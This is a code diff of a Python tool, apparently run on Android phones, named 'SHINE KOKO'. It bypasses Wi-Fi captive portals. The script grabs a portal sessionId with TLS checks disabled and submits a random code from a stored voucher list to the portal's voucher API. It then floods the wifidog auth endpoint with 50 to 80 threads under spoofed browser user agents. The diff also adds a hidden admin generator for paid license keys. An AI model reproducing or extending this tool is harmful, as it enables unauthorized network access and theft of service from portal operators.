@@ -17,7 +17,7 @@ STOP_THREADS = threading.Event()
 
 def get_device_info():
     try:
-        # Get Device ID (using whoami + hash of some system info)
+        # Get Device ID (using whoami)
         uid = subprocess.check_output(['whoami']).decode('utf-8').strip()
         # Get Device Model
         model = subprocess.check_output(['getprop', 'ro.product.model']).decode('utf-8').strip()
@@ -84,16 +84,35 @@ def banner():
     print(f"\033[95m 👑 MASTER: {USER_NAME} | \033[92m📅 EXP: {EXP_DATE}")
     print("\033[93m" + "="*38 + "\033[0m")
 
+def admin_key_gen():
+    os.system('clear')
+    print("\033[96m" + "="*40)
+    print("      SHINE KOKO ADMIN KEY GEN")
+    print("="*40 + "\033[0m")
+    key_name = input("\033[97m [?] Enter Key Name: \033[0m").strip()
+    print("\n [1] 1 Hour  [2] 3 Hours  [3] 5 Hours")
+    print(" [4] 1 Day   [5] 3 Days   [6] 7 Days")
+    print(" [7] 15 Days [8] 30 Days")
+    choice = input("\033[97m\n [?] Choice: \033[0m")
+    durations = {"1":1, "2":3, "3":5, "4":24, "5":72, "6":168, "7":360, "8":720}
+    if choice in durations:
+        expiry = datetime.now() + timedelta(hours=durations[choice])
+        final_line = f"{key_name} | {expiry.strftime('%Y-%m-%d %H:%M:%S')}"
+        print("\033[92m\n " + "="*38)
+        print(" SUCCESS! COPY THE LINE BELOW:")
+        print(" " + "="*38 + "\033[0m")
+        print(f"\n \033[93m{final_line}\033[0m\n")
+        input("\033[97m [~] Press Enter to return... \033[0m")
+    else:
+        print("\033[91m [!] Invalid Choice!\033[0m")
+        time.sleep(2)
+
 def get_advanced_headers():
     browsers = [
         f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
         f"Mozilla/5.0 (Linux; Android {random.randint(11,14)}; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
     ]
-    return {
-        "User-Agent": random.choice(browsers),
-        "Accept": "*/*",
-        "Connection": "keep-alive"
-    }
+    return {"User-Agent": random.choice(browsers), "Accept": "*/*", "Connection": "keep-alive"}
 
 def show_ping_live():
     while True:
@@ -118,83 +137,72 @@ def turbo_pulse(link, mode):
 
 def launch():
     global AI_STATUS, STOP_THREADS, USER_NAME, EXP_DATE, AUTHORIZED
+    uid, _ = get_device_info()
     update_status()
     banner()
     
     if not AUTHORIZED:
         print("\033[91m [!] This device is not pre-authorized. \033[0m")
-        user_key = input("\033[97m [?] Enter License Key: ")
+        user_key = input("\033[97m [?] Enter License Key: ").strip()
         is_valid, info = check_key(user_key)
         if is_valid:
             print(f"\033[92m [✓] Key Accepted! Expires: {info} \033[0m")
-            USER_NAME = "Premium User"
-            EXP_DATE = info
-            time.sleep(2)
-            banner()
+            USER_NAME, EXP_DATE, AUTHORIZED = "Premium User", info, True
+            time.sleep(2); banner()
         else:
-            print(f"\033[91m [✗] Access Denied: {info} \033[0m")
-            sys.exit()
+            print(f"\033[91m [✗] Access Denied! \033[0m")
+            input("\033[97m [~] Press Enter to exit... \033[0m"); sys.exit()
 
-    print("\033[92m [1] 🧠 Balanced Mode (穩定) \033[0m")
-    print("\033[91m [2] 🔥 Turbo Mode (加速) \033[0m")
-    choice = input("\033[97m\n [?] Select Power: ")
-    threads = 80 if choice == "2" else 50
-
-    threading.Thread(target=show_ping_live, daemon=True).start()
-
-    session = requests.Session()
-    print(f"\n\033[93m[*] Starting SHINE KOKO engine with {threads} threads...\033[0m")
-    
     while True:
-        try:
-            STOP_THREADS.clear()
-            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=8)
-            p_url = r.url
-            parsed = urlparse(p_url)
-            
-            if "generate_204" not in p_url:
-                print(f"\033[96m[*] Found portal: {parsed.netloc}\033[0m")
-                gw = parse_qs(parsed.query).get('gw_address', [parsed.netloc.split(':')[0]])[0]
-                if not gw: gw = socket.gethostbyname(parsed.netloc)
-                
-                r1 = session.get(p_url, verify=False, timeout=8, headers=get_advanced_headers())
-                m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
-                n_url = urljoin(p_url, m.group(1)) if m else p_url
-                
-                r2 = session.get(n_url, verify=False, timeout=8, headers=get_advanced_headers())
-                sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
-                
-                if sid:
-                    v_code = random.choice(VOUCHER_LIST)
-                    time.sleep(1) 
-                    session.post(f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/", 
-                                json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, 
-                                timeout=5, headers=get_advanced_headers())
-                    
-                    auth_link = f"http://{gw}:2060/wifidog/auth?token={sid}"
-                    print(f"\n\033[92m[*] ⚡ BYPASS SUCCESS! ⚡\033[0m")
-                    
-                    for _ in range(threads):
-                        threading.Thread(target=turbo_pulse, args=(auth_link, choice), daemon=True).start()
-                    
-                    while True:
-                        time.sleep(0.5)
-                        try:
-                            c = requests.get("http://www.google.com/generate_204", timeout=5)
-                            if c.status_code != 204: raise Exception("Off")
-                        except:
-                            AI_STATUS = "Rescue"; break
-                    STOP_THREADS.set()
+        banner()
+        print("\033[92m [1] 🧠 Balanced Mode (穩定) \033[0m")
+        print("\033[91m [2] 🔥 Turbo Mode (加速) \033[0m")
+        if uid == "u0_a304":
+            print("\033[93m [3] 🔑 Admin: Key Generator \033[0m")
+        
+        choice = input("\033[97m\n [?] Select Power: ")
+        
+        if choice == "3" and uid == "u0_a304":
+            admin_key_gen()
+            continue
+        
+        threads = 80 if choice == "2" else 50
+        threading.Thread(target=show_ping_live, daemon=True).start()
+        session = requests.Session()
+        print(f"\n\033[93m[*] Starting SHINE KOKO engine with {threads} threads...\033[0m")
+        
+        while True:
+            try:
+                STOP_THREADS.clear()
+                r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=8)
+                p_url = r.url
+                if "generate_204" not in p_url:
+                    parsed = urlparse(p_url)
+                    gw = parse_qs(parsed.query).get('gw_address', [parsed.netloc.split(':')[0]])[0]
+                    r1 = session.get(p_url, verify=False, timeout=8, headers=get_advanced_headers())
+                    m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+                    n_url = urljoin(p_url, m.group(1)) if m else p_url
+                    r2 = session.get(n_url, verify=False, timeout=8, headers=get_advanced_headers())
+                    sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+                    if sid:
+                        v_code = random.choice(VOUCHER_LIST)
+                        session.post(f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/", 
+                                    json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, 
+                                    timeout=5, headers=get_advanced_headers())
+                        auth_link = f"http://{gw}:2060/wifidog/auth?token={sid}"
+                        print(f"\n\033[92m[*] ⚡ BYPASS SUCCESS! ⚡\033[0m")
+                        for _ in range(threads):
+                            threading.Thread(target=turbo_pulse, args=(auth_link, choice), daemon=True).start()
+                        while True:
+                            time.sleep(1)
+                            try:
+                                if requests.get("http://www.google.com/generate_204", timeout=5).status_code != 204: raise Exception()
+                            except: break
+                        STOP_THREADS.set()
                 else:
-                    AI_STATUS = "Discovery"; time.sleep(2)
-            else:
-                AI_STATUS = "Online"; 
-                sys.stdout.write(f"\r \033[92m[*] SHINE KOKO: Internet is active. Monitoring...\033[0m")
-                sys.stdout.flush()
-                time.sleep(5)
-                
-        except Exception as e:
-            AI_STATUS = "Rescue"; time.sleep(2)
+                    AI_STATUS = "Online"; time.sleep(5)
+            except:
+                AI_STATUS = "Rescue"; time.sleep(2)
 
 if __name__ == "__main__":
     try: launch()
